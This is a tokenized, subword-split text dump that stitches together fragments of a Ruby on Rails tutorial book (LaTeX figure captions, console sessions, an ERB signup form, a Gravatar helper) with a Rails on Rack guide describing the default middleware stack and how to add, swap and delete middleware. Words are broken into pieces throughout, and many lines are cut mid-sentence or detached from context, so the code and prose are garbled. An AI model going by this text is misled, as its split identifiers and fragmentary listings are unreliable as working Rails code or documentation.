▁The ▁default ▁Rails ▁page ▁served ▁by ▁\ text tt { rails ▁server }.
▁We ' ll ▁see ▁in ▁just ▁a ▁moment ▁the ▁benefit s ▁of ▁adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model ▁( Section ~\ ref { sec : creating _ a _ user }), ▁but ▁first ▁we ' ll ▁add ▁a ▁minimal ▁requirement ▁on ▁password ▁security .
▁in ▁Listing ~\ ref { code : failing _ validates _ name _ test }.
▁If ▁you ' ve ▁followed ▁the ▁steps ▁in ▁Section ~\ ref { sec : repository _ host }, ▁you ▁m ight ▁notice ▁that ▁Bitbucket ▁did n ' t ▁automatically ▁detect ▁the ▁\ k ode { README . rdoc } ▁file ▁from ▁our ▁repository , ▁instead ▁complain ing ▁on ▁the ▁main ▁repository ▁page ▁that ▁there ▁is ▁no ▁README ▁present ▁( F igure ~\ ref { fig : bitbucket _ no _ readme }).
▁( You ▁m ight ▁also ▁consider ▁the ▁\ href { http :// www . code school . com / c our s es / test ing - with - rspec }{ R S p ec ▁course ▁at ▁Code ▁School }, ▁which ▁one ▁reader ▁has ▁said ▁an s w er ed ▁a ▁lot ▁of ▁his ▁RSpec ▁question s .)
▁To ▁install ▁and ▁include ▁the ▁new ▁gems , ▁we ▁run ▁\ k ode { bundle ▁update } ▁and ▁\ k ode { bundle ▁install } :
▁This ▁is ▁a ▁`` remember ed ▁option '' , ▁which ▁means ▁that ▁we ▁don ' t ▁have ▁to ▁include ▁it ▁in ▁future ▁ invocation s ▁of ▁Bundler .
▁A ▁mockup ▁of ▁a ▁profile ▁page ▁with ▁microposts . ~\ href { http :// railstutorial . org / images / figures / user _ microposts _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁user ▁profile ▁page ▁with ▁code ▁for ▁microposts --- but ▁no ▁microposts . ~\ href { http :// railstutorial . org / images / figures / user _ profile _ no _ microposts _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁user ▁profile ▁(\ href { http :// localhost :3000/ users /1}{ / users /1 }) ▁with ▁un style d ▁microposts . ~\ href { http :// railstutorial . org / images / figures / user _ profile _ microposts _ no _ st y l ing _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁user ▁profile ▁(\ href { http :// localhost :3000/ users /1}{ / users /1 }) ▁with ▁microposts . ~\ href { http :// railstutorial . org / images / figures / user _ profile _ with _ microposts _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁profile ▁of ▁a ▁different ▁user , ▁also ▁with ▁microposts ▁(\ href { http :// localhost :3000/ users / 5 }{/ users / 5 }). ~\ href { http :// railstutorial . org / images / figures / other _ profile _ with _ microposts _ bootstrap - full . png }{ ( full ▁size )}
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁form ▁for ▁creating ▁microposts . ~\ href { http :// railstutorial . org / images / figures / home _ page _ with _ micropost _ form _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/ }{/ }) ▁with ▁a ▁new ▁micropost ▁form . ~\ href { http :// railstutorial . org / images / figures / home _ with _ form _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁home ▁page ▁with ▁form ▁errors . ~\ href { http :// railstutorial . org / images / figures / home _ form _ errors _ bootstrap - full . png }{ ( full ▁size )}
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁proto - feed . ~\ href { http :// railstutorial . org / images / figures / proto _ feed _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁Home ▁page ▁(\ href { http :// localhost :3000/ }{/ }) ▁with ▁a ▁proto - feed . ~\ href { http :// railstutorial . org / images / figures / home _ with _ proto _ feed - full . png }{ ( full ▁size )}
▁The ▁Home ▁page ▁after ▁creating ▁a ▁new ▁micropost . ~\ href { http :// railstutorial . org / images / figures / micropost _ created _ bootstrap - full . png }{ ( full ▁size )}
▁A ▁mockup ▁of ▁the ▁proto - feed ▁with ▁micropost ▁delete ▁links . ~\ href { http :// railstutorial . org / images / figures / micropost _ delete _ links _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁user ▁home ▁page ▁after ▁deleting ▁the ▁second - most - recent ▁micropost . ~\ href { http :// railstutorial . org / images / figures / home _ post _ delete _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁( br o k en ) ▁site ▁layout ▁with ▁a ▁particular ly ▁long ▁word . ~\ href { http :// railstutorial . org / images / figures / long _ word _ micropost _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁first ▁ critical ▁step ▁is ▁to ▁create ▁a ▁\ emph { data ▁model } ▁for ▁users ▁of ▁our ▁site , ▁together ▁with ▁a ▁way ▁to ▁store ▁that ▁data .
▁A ▁valid ▁email ▁regex ▁that ▁d is allow s ▁double ▁do t s ▁in ▁email ▁address ed .
▁ Content s ▁of ▁the ▁sample ▁app ' s ▁\ k ode { config } ▁directory . ~\ href { http :// railstutorial . org / images / figures / config _ directory _ rails _ 4 - full . png }{ ( full ▁size )}
▁The ▁raw ▁home ▁view ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }). ~\ href { http :// railstutorial . org / images / figures / raw _ home _ view _ 3 1 - full . png }{ ( full ▁size )}
▁A ▁re d ▁( failing ) ▁test . ~\ href { http :// railstutorial . org / images / figures / r ed _ failing _ spec _4_0 - full . png }{ ( full ▁size )}
▁A ▁green ▁( passing ) ▁test . ~\ href { http :// railstutorial . org / images / figures / g re en _ passing _ spec _4_0 - full . png }{ ( full ▁size )}
▁The ▁new ▁About ▁page ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static \_ pages / about }). ~\ href { http :// railstutorial . org / images / figures / about _ us _ 2 n d _ edit ion - full . png }{ ( full ▁size )}
▁As ▁a ▁result , ▁WEBrick ▁\ href { https :// dev center . heroku . com / articles / ruby - default - web - server }{ is n ' t ▁suit able ▁for ▁production ▁use }, ▁so ▁we ' ll ▁\ href { https :// dev center . heroku . com / articles / rails - P um a }{ re place ▁WEBrick ▁with ▁Puma }, ▁an ▁HTTP ▁server ▁that ▁is ▁capab le ▁of ▁handling ▁a ▁large ▁number ▁of ▁in com ing ▁requests .
▁To ▁add ▁the ▁new ▁webserver , ▁we ▁simply ▁follow ▁the ▁\ href { https :// dev center . heroku . com / articles / rails - P um a }{ Heroku ▁Puma ▁documentation }.
▁\ href { http :// on line . p ra g ma tic st udi o . com /}{ P ra g ma tic ▁S t udi o } : ▁On line ▁Ruby ▁and ▁Rails ▁course s ▁from ▁M ike ▁and ▁N ic o le ▁C l ar k .
▁See ▁the ▁\ href { http :// api . rubyonrails . org / v 4.2.0 . r c 2 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁The ▁second ▁half ▁of ▁the ▁association , ▁\ k ode { has \_ many ▁: microposts }, ▁needs ▁to ▁be ▁added ▁by ▁hand , ▁as ▁show n ▁in ▁( Listing ~\ ref { code : user _ has _ many _ microposts }).
▁in ▁Listing ~\ ref { code : log _ out _ method }.
▁Load ing ▁development ▁environment
▁ >> ▁Rails . env
▁=> ▁" development "
▁ >> ▁Rails . env . development ?
▁=> ▁true
▁ >> ▁Rails . env . test ?
▁=> ▁false
▁ $ ▁rails ▁console ▁test
▁Load ing ▁test ▁environment
▁=> ▁" test "
▁ $ ▁rails ▁server ▁-- environment ▁production
▁ $ ▁bundle ▁exec ▁rake ▁db : migrate ▁R AIL S _ ENV = production
▁ $ ▁ heroku ▁run ▁console
▁Ruby ▁console ▁for ▁your app . heroku app . com
▁=> ▁" production "
▁ >> ▁Rails . env . production ?
▁In ▁the ▁next ▁chapter , ▁we ' ll ▁build ▁on ▁the ▁foundation ▁from ▁Chapter ~\ ref { cha : begin n ers } ▁to ▁make ▁a ▁database - back ed ▁\ emph { toy ▁app }, ▁which ▁will ▁give ▁us ▁our ▁first ▁real ▁taste ▁of ▁what ▁Rails ▁can ▁do .
▁See ▁the ▁\ href { http :// api . rubyonrails . org / v 4.2.0 . r c 1 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁ n { U s ing ▁keyword ▁arguments ▁in ▁the ▁\ k ode { gravatar \_ for } ▁helper . ▁\ \ ▁\ file path { app / helpers / users \_ helper . rb } }< n > %= ▁ lang : ruby , ▁options : ▁" h l _ line s " : ▁[ 4 ] < n >\ begin { code }< n > module ▁Users Helper < n >< n > ▁# ▁Return s ▁the ▁Gravatar ▁for ▁the ▁given ▁user . < n > ▁def ▁ gravatar _ for ( user , ▁size : ▁80 )< n > ▁ gravatar _ id ▁= ▁D ig est :: M D 5 :: h ex digest ( user . email . downcase )< n > ▁ gravatar _ url ▁= ▁" https :// secure . gravatar . com / avatar / # { gravatar _ id } ? s = # { size } " < n > ▁image _ tag ( gravatar _ url , ▁ alt : ▁user . name , ▁class : ▁" gravatar " )< n > ▁end < n > end < n >\ end { code }< n >\ end { code listing }< n >< n > ▁% ▁subsection ▁a _ gravatar _ image ▁( end )< n >< n > ▁\ section { Sign up ▁form } ▁% ▁( fold )< n > ▁\ label { sec : signup _ form }< n >< n >
▁is e ' ▁id =' ex - ad 9 f d 0 ' ></ span >< n >< n >\ end { enumerate }< n >< n >< n > ▁% ▁subsection ▁signup _ error _ messages ▁( end )< n >< n >< n > ▁\ subsection { A ▁test ▁for ▁invalid ▁submission } ▁% ▁( fold )< n > ▁\ label { sec : a _ test _ for _ invalid _ submission }< n >< n >
▁%>< n >< n > ▁<%= ▁f . label ▁: password ▁%>< n > ▁<%= ▁f . password _ field ▁: password , ▁class : ▁' form - control ' ▁%>< n >< n > ▁<%= ▁f . label ▁: password _ confirmation , ▁" Co n fi rm ation " ▁%>< n > ▁<%= ▁f . password _ field ▁: password _ confirmation , ▁class : ▁' form - control ' ▁%>< n >< n > ▁<%= ▁f . submit ▁" Create ▁my ▁account ", ▁class : ▁" b t n ▁b t n - primary " ▁%>< n > ▁<% ▁end ▁%>< n > ▁</ div >< n ></ div >< n >\ end { code }< n >\ end { code listing }< n >< n > ▁% ▁subsection ▁a _ test _ for _ invalid _ submission ▁( end )< n >< n > ▁% ▁section ▁ unsuccessful _ signup s ▁( end )< n >< n > ▁\ section { S u cc es s ful ▁signup s } ▁% ▁( fold )< n > ▁\ label { sec : successful _ signup s }< n >< n >
▁end { enumerate }< n >< n > ▁% ▁subsection ▁the _ flash ▁( end )< n >< n > ▁\ subsection { The ▁first ▁signup } ▁% ▁( fold )< n > ▁\ label { sec : the _ first _ signup }< n >< n >
▁ n d ▁%>< n > ▁ . < n > ▁ . < n > ▁ . < n ></ html >< n >\ end { code }< n >\ end { code listing }< n >< n >% ▁subsection ▁a _ test _ for _ valid _ submission ▁( end )< n >< n > ▁\ section { P rofessional - grade ▁deployment } ▁% ▁( fold )< n > ▁\ label { sec : p rofessional _ grade _ deploy ment }< n >< n >
▁ grade _ deploy ment ▁( end )< n >< n > ▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : sign _ up _ co nclusion }< n >< n > B e ing ▁able ▁to ▁sign ▁up ▁users ▁is ▁a ▁major ▁m il est one ▁for ▁our ▁application .
▁\ no indent ▁\ emph { Learn ▁E n ough ▁Co m m and ▁L ine ▁to ▁Be ▁D an g er ous } ▁is ▁an ▁introduction ▁to ▁the ▁command ▁line ▁for ▁complete ▁beginners , ▁the ▁first ▁in ▁a ▁\ href { http :// learn en ough . com /}{ s er ies ▁of ▁tutorial s } ▁design ed ▁to ▁teach ▁the ▁common ▁foundation s ▁of ▁`` computer ▁magic '' ▁( B o x ~\ ref { aside : computer _ magic }) ▁to ▁as ▁broad ▁an ▁a udi ence ▁as ▁possible .
▁It ▁is ▁a i m ed ▁both ▁at ▁those ▁who ▁work ▁with ▁software ▁developers ▁and ▁those ▁who ▁as p i re ▁to ▁become ▁developers ▁themselves .
▁Un like ▁most ▁introduction s ▁to ▁the ▁command ▁line , ▁which ▁typical ly ▁assume ▁a ▁relative ly ▁high ▁level ▁of ▁technical ▁sophistication , ▁\ emph { Learn ▁E n ough ▁Co m m and ▁L ine ▁to ▁Be ▁D an g er ous } ▁assume s ▁no ▁ prerequisites ▁other ▁than ▁general ▁computer ▁ knowledg e ▁( how ▁to ▁ la un ch ▁an ▁application , ▁how ▁to ▁use ▁a ▁web ▁browser , ▁how ▁to ▁\ href { http :// l m gt f y . com / ? q = learn + to + touch + type }{ touch ▁type }, ▁etc . ).
▁Rails ▁on ▁Rack
▁== = ==========
▁This ▁guide ▁cover s ▁Rails ▁integration ▁with ▁Rack ▁and ▁in ter f ac ing ▁with ▁other ▁Rack ▁components .
▁* ▁How ▁to ▁use ▁Rack ▁Middleware s ▁in ▁your ▁Rails ▁applications .
▁* ▁Action ▁Pack ' s ▁internal ▁Middleware ▁stack .
▁* ▁How ▁to ▁define ▁a ▁custom ▁Middleware ▁stack .
▁WARNING : ▁This ▁guide ▁assume s ▁a ▁working ▁ knowledg e ▁of ▁Rack ▁protocol ▁and ▁Rack ▁ concept s ▁such ▁as ▁middleware s , ▁url ▁map s ▁and ▁` Rack :: Builder `.
▁In tr o d u c t ion ▁to ▁Rack
▁Rack ▁provides ▁a ▁minimal , ▁ mod ul ar ▁and ▁ adapt able ▁interface ▁for ▁developing ▁web ▁applications ▁in ▁Ruby .
▁By ▁wrapp ing ▁HTTP ▁requests ▁and ▁response s ▁in ▁the ▁simplest ▁way ▁possible , ▁it ▁un if ies ▁and ▁d i still s ▁the ▁API ▁for ▁web ▁server s , ▁web ▁frameworks , ▁and ▁software ▁in ▁between ▁( the ▁so - called ▁middleware ) ▁into ▁a ▁single ▁method ▁call .
▁* ▁[ Rack ▁API ▁Documentation ]( http :// rack . github . io / )
▁ Ex plain ing ▁Rack ▁is ▁not ▁really ▁in ▁the ▁scope ▁of ▁this ▁guide .
▁In ▁case ▁you ▁are ▁not ▁ familiar ▁with ▁Rack ' s ▁basic s , ▁you ▁should ▁check ▁out ▁the ▁[ Re source s ](# resources ) ▁section ▁below .
▁Rails ▁on ▁Rack
▁### ▁Rails ▁Application ' s ▁Rack ▁Object
▁` Rails . application ` ▁is ▁the ▁primary ▁Rack ▁application ▁object ▁of ▁a ▁Rails < n > application .
▁Any ▁Rack ▁com p li ant ▁web ▁server ▁should ▁be ▁using < n >` Rails . application ` ▁object ▁to ▁serve ▁a ▁Rails ▁application .
▁### ▁` rails ▁server `
▁` rails ▁server ` ▁does ▁the ▁basic ▁job ▁of ▁creating ▁a ▁` Rack :: Server ` ▁object ▁and ▁starting ▁the ▁webserver .
▁Here ' s ▁how ▁` rails ▁server ` ▁creates ▁an ▁instance ▁of ▁` Rack :: Server `
▁Rails :: Server . new . t ap ▁do ▁| server |
▁require ▁A P P _ P A T H
▁D ir . ch d ir ( Rails . application . root )
▁server . start
▁The ▁` Rails :: Server ` ▁inherit s ▁from ▁` Rack :: Server ` ▁and ▁calls ▁the ▁` Rack :: Server # start ` ▁method ▁this ▁way :
▁class ▁ Server ▁< ▁: : Rack :: Server
▁def ▁start
▁ super
▁Here ' s ▁how ▁it ▁load s ▁the ▁middleware s :
▁def ▁middleware
▁middleware s ▁= ▁[]
▁middleware s ▁< < ▁[ Rails :: Rack :: Debugger ] ▁if ▁options [: debugger ]
▁middleware s ▁< < ▁[ :: Rack :: Content L en g th ]
▁ Hash . new ( middleware s )
▁` Rails :: Rack :: Debugger ` ▁is ▁p r i m ar ily ▁useful ▁only ▁in ▁the ▁development ▁environment .
▁The ▁following ▁table ▁ explain s ▁the ▁usage ▁of ▁the ▁loaded ▁middleware s :
▁| ▁Middleware ▁| ▁P urpose ▁|
▁| ▁-------------- --------- ▁| ▁- ---------------- ---------------- ---------------- ---------------- ---------------- ▁|
▁| ▁` Rails :: Rack :: Debugger ` ▁| ▁Start s ▁ Debugger ▁|
▁To ▁use ▁` rack up ` ▁instead ▁of ▁Rails ' ▁` rails ▁server `, ▁you ▁can ▁put ▁the ▁following ▁inside ▁` config . ru ` ▁of ▁your ▁Rails ▁application ' s ▁root ▁directory :
▁# ▁Rails . root / config . ru
▁require ▁: : File . expand _ path (' . . / config / environment ' , ▁ _ _ F I LE _ _ )
▁use ▁Rack :: Content L en g th
▁run ▁Rails . application
▁And ▁start ▁the ▁server :
▁ $ ▁ rack up ▁config . ru
▁To ▁find ▁out ▁more ▁about ▁different ▁` rack up ` ▁options :
▁ $ ▁ rack up ▁-- help
▁Action ▁D is patch er ▁Middleware ▁S t ac k
▁M any ▁of ▁Action ▁D is patch er ' s ▁internal ▁components ▁are ▁implemented ▁as ▁Rack ▁middleware s .
▁` Rails :: Application ` ▁uses ▁` ActionDispatch :: Middleware S t ac k ` ▁to ▁combine ▁ various ▁internal ▁and ▁external ▁middleware s ▁to ▁form ▁a ▁complete ▁Rails ▁Rack ▁application .
▁NOTE : ▁` ActionDispatch :: Middleware S t ac k ` ▁is ▁Rails ▁equivalent ▁of ▁` Rack :: Builder `, ▁but ▁built ▁for ▁better ▁flexibility ▁and ▁more ▁features ▁to ▁me et ▁Rails ' ▁requirements .
▁### ▁In spec ting ▁Middleware ▁S t ac k
▁Rails ▁has ▁a ▁hand y ▁rake ▁task ▁for ▁ inspect ing ▁the ▁middleware ▁stack ▁in ▁use :
▁For ▁a ▁fresh ly ▁generated ▁Rails ▁application , ▁this ▁m ight ▁produce ▁something ▁like :
▁use ▁Rack :: Sendfile
▁use ▁ ActionDispatch :: S t at ic
▁use ▁Rack :: Lock
▁use ▁#< ActiveSupport :: Cache :: S trategy :: Local Cache :: Middleware : 0 x 000 0000 2 9 a 08 38 >
▁use ▁Rack :: Runtime
▁use ▁Rack :: Method O ve r r id e
▁use ▁ ActionDispatch :: Request I d
▁use ▁Rails :: Rack :: Logger
▁use ▁ ActionDispatch :: ShowExceptions
▁use ▁ ActionDispatch :: D e b ug E xception s
▁use ▁ ActionDispatch :: Re m o t e I p
▁use ▁ ActionDispatch :: Re load er
▁use ▁ ActionDispatch :: Callbacks
▁use ▁ActiveRecord :: Migration :: C h ec k P end ing
▁use ▁ActiveRecord :: Connection Adapters :: Connection M an age ment
▁use ▁ActiveRecord :: Query Cache
▁use ▁ ActionDispatch :: Co o k ies
▁use ▁ ActionDispatch :: Session :: CookieStore
▁use ▁ ActionDispatch :: Flash
▁use ▁ ActionDispatch :: ParamsParser
▁use ▁Rack :: Head
▁use ▁Rack :: Conditional G et
▁use ▁Rack :: ETag
▁run ▁Rails . application . routes
▁The ▁default ▁middleware s ▁show n ▁here ▁( and ▁some ▁other s ) ▁are ▁each ▁summariz ed ▁in ▁the ▁[ In ter n al ▁Middleware s ](# internal - middleware - stack ) ▁section , ▁below .
▁### ▁Configur ing ▁Middleware ▁S t ac k
▁Rails ▁provides ▁a ▁simple ▁configuration ▁interface ▁` config . middleware ` ▁for ▁adding , ▁remov ing ▁and ▁modify ing ▁the ▁middleware s ▁in ▁the ▁middleware ▁stack ▁via ▁` application . rb ` ▁or ▁the ▁environment ▁specific ▁configuration ▁file ▁` environments / < environment > . rb `.
▁#### ▁ Adding ▁a ▁Middleware
▁You ▁can ▁add ▁a ▁new ▁middleware ▁to ▁the ▁middleware ▁stack ▁using ▁any ▁of ▁the ▁following ▁methods :
▁* ▁` config . middleware . use ( new _ middleware , ▁ args )` ▁- ▁Add s ▁the ▁new ▁middleware ▁at ▁the ▁bottom ▁of ▁the ▁middleware ▁stack .
▁* ▁` config . middleware . insert _ before ( ex ist ing _ middleware , ▁new _ middleware , ▁ args )` ▁- ▁Add s ▁the ▁new ▁middleware ▁before ▁the ▁specified ▁existing ▁middleware ▁in ▁the ▁middleware ▁stack .
▁* ▁` config . middleware . insert _ after ( ex ist ing _ middleware , ▁new _ middleware , ▁ args )` ▁- ▁Add s ▁the ▁new ▁middleware ▁after ▁the ▁specified ▁existing ▁middleware ▁in ▁the ▁middleware ▁stack .
▁# ▁P us h ▁Rack :: B o un ce F a v ic on ▁at ▁the ▁bottom
▁config . middleware . use ▁Rack :: B o un ce F a v ic on
▁# ▁Pass ▁ { ▁page _ cache : ▁false ▁ } ▁argument ▁to ▁ Lifo :: Cache .
▁config . middleware . insert _ after ▁ActiveRecord :: Query Cache , ▁ Lifo :: Cache , ▁page _ cache : ▁false
▁#### ▁S w app ing ▁a ▁Middleware
▁You ▁can ▁ s w ap ▁an ▁existing ▁middleware ▁in ▁the ▁middleware ▁stack ▁using ▁` config . middleware . s w ap `.
▁# ▁Re place ▁ ActionDispatch :: ShowExceptions ▁with ▁ Lifo :: ShowExceptions
▁config . middleware . s w ap ▁ ActionDispatch :: ShowExceptions , ▁ Lifo :: ShowExceptions
▁#### ▁Delet ing ▁a ▁Middleware
▁Add ▁the ▁following ▁lines ▁to ▁your ▁application ▁configuration :
▁config . middleware . delete ▁" Rack :: Lock "
▁And ▁now ▁if ▁you ▁ inspect ▁the ▁middleware ▁stack , ▁you ' ll ▁find ▁that ▁` Rack :: Lock ` ▁is < n > not ▁a ▁part ▁of ▁it .
▁( in ▁/ Users / li f o / Rails / blog )
▁use ▁#< ActiveSupport :: Cache :: S trategy :: Local Cache :: Middleware : 0 x 000 0000 1 c 3 04 c 8 >
▁If ▁you ▁want ▁to ▁remove ▁session ▁related ▁middleware , ▁do ▁the ▁following :
▁config . middleware . delete ▁" ActionDispatch :: Co o k ies "
▁config . middleware . delete ▁" ActionDispatch :: Session :: CookieStore "
▁config . middleware . delete ▁" ActionDispatch :: Flash "
▁And ▁to ▁remove ▁browser ▁related ▁middleware ,
▁### ▁In ter n al ▁Middleware ▁S t ac k
▁M u ch ▁of ▁Action ▁Controller ' s ▁functionality ▁is ▁implemented ▁as ▁Middleware s .
▁The ▁following ▁list ▁ explain s ▁the ▁purpose ▁of ▁each ▁of ▁them :
▁* ▁Set s ▁server ▁specific ▁ X - Sendfile ▁header .
▁Configur e ▁this ▁via ▁` config . action _ dispatch . x _ s end file _ header ` ▁option .
▁**` ActionDispatch :: S t at ic ` **
▁* ▁Set s ▁` env [ " rack . multi th read "] ` ▁flag ▁to ▁` false ` ▁and ▁wrap s ▁the ▁application ▁within ▁a ▁M ute x .
▁**` ActiveSupport :: Cache :: S trategy :: Local Cache :: Middleware ` **
▁* ▁Use d ▁for ▁memory ▁caching .
▁This ▁cache ▁is ▁not ▁thread ▁safe .
▁**` Rack :: Runtime ` **
▁* ▁Set s ▁an ▁ X - Runtime ▁header , ▁containing ▁the ▁time ▁( in ▁second s ) ▁take n ▁to ▁execute ▁the ▁request .
▁**` Rack :: Method O ve r r id e ` **
▁* ▁A l low s ▁the ▁method ▁to ▁be ▁overrid de n ▁if ▁` params [: _ method ]` ▁is ▁set .
▁This ▁is ▁the ▁middleware ▁which ▁supports ▁the ▁ PUT ▁and ▁DELETE ▁HTTP ▁method ▁types .
▁**` ActionDispatch :: Request I d ` **
▁* ▁Mak es ▁a ▁unique ▁` X - Request - I d ` ▁header ▁available ▁to ▁the ▁response ▁and ▁enable s ▁the ▁` ActionDispatch :: Request # u u id ` ▁method .
▁**` Rails :: Rack :: Logger ` **
▁* ▁Noti f ies ▁the ▁log s ▁that ▁the ▁request ▁has ▁be g an .
▁**` ActionDispatch :: ShowExceptions ` **
▁* ▁Re sc ue s ▁any ▁exception ▁returned ▁by ▁the ▁application ▁and ▁calls ▁an ▁exception s ▁app ▁that ▁will ▁wrap ▁it ▁in ▁a ▁format ▁for ▁the ▁end ▁user .
▁**` ActionDispatch :: D e b ug E xception s ` **
▁* ▁Re s p on s i b le ▁for ▁logging ▁exception s ▁and ▁show ing ▁a ▁debugging ▁page ▁in ▁case ▁the ▁request ▁is ▁local .
▁**` ActionDispatch :: Re m o t e I p ` **
▁* ▁Check s ▁for ▁ IP ▁sp o of ing ▁attacks .
▁**` ActionDispatch :: Re load er ` **
▁* ▁Provide s ▁ prepare ▁and ▁ cleanup ▁callbacks , ▁intend ed ▁to ▁assist ▁with ▁code ▁reload ing ▁during ▁development .
▁**` ActionDispatch :: Callbacks ` **
▁**` ActiveRecord :: Migration :: C h ec k P end ing ` **
▁* ▁Check s ▁ pending ▁migrations ▁and ▁raise s ▁` ActiveRecord :: P end ing Migration Error ` ▁if ▁any ▁migrations ▁are ▁ pending .
▁**` ActiveRecord :: Connection Adapters :: Connection M an age ment ` **
▁* ▁C le an s ▁active ▁connection s ▁after ▁each ▁request , ▁unless ▁the ▁` rack . test ` ▁key ▁in ▁the ▁request ▁environment ▁is ▁set ▁to ▁` true `.
▁**` ActiveRecord :: Query Cache ` **
▁* ▁E n able s ▁the ▁Active ▁Record ▁query ▁cache .
▁**` ActionDispatch :: Co o k ies ` **
▁* ▁Set s ▁cookies ▁for ▁the ▁request .
▁**` ActionDispatch :: Session :: CookieStore ` **
▁* ▁Re s p on s i b le ▁for ▁storing ▁the ▁session ▁in ▁cookies .
▁**` ActionDispatch :: Flash ` **
▁* ▁Set s ▁up ▁the ▁flash ▁keys .
▁**` ActionDispatch :: ParamsParser ` **
▁* ▁P ar s es ▁out ▁parameters ▁from ▁the ▁request ▁into ▁` params `.
▁* ▁Convert s ▁H E A D ▁requests ▁to ▁` GET ` ▁requests ▁and ▁serve s ▁them ▁as ▁so .
▁**` Rack :: Conditional G et ` **
▁* ▁Add s ▁support ▁for ▁" Conditional ▁` GET ` " ▁so ▁that ▁server ▁respond s ▁with ▁nothing ▁if ▁page ▁was n ' t ▁changed .
▁**` Rack :: ETag ` **
▁* ▁Add s ▁ ETag ▁header ▁on ▁all ▁ String ▁b o d ies .
▁ ETag s ▁are ▁used ▁to ▁validate ▁cache .
▁TIP : ▁It ' s ▁possible ▁to ▁use ▁any ▁of ▁the ▁above ▁middleware s ▁in ▁your ▁custom ▁Rack ▁stack .
▁Resource s
▁### ▁ Learn ing ▁Rack
▁* ▁[ O ff i cial ▁Rack ▁Web site ]( http :// rack . github . io )
▁* ▁[ In tr o d u c ing ▁Rack ]( http :// ch n e u k ir ch en . org / blog / archive / 200 7 / 02 / in tr o d u c ing - rack . html )
▁* ▁[ Ruby ▁on ▁Rack ▁# 1 ▁- ▁ Hello ▁Rack ! ](
▁* ▁[ Ruby ▁on ▁Rack ▁# 2 ▁- ▁The ▁ Builder ]( http :// m . on key . org / ruby - on - rack - 2 - the - builder )
▁### ▁Under st and ing ▁Middleware s
▁* ▁[ Rails ca st ▁on ▁Rack ▁Middleware s ]( http :// r ailscasts . com / episodes / 15 1 - rack - middleware )
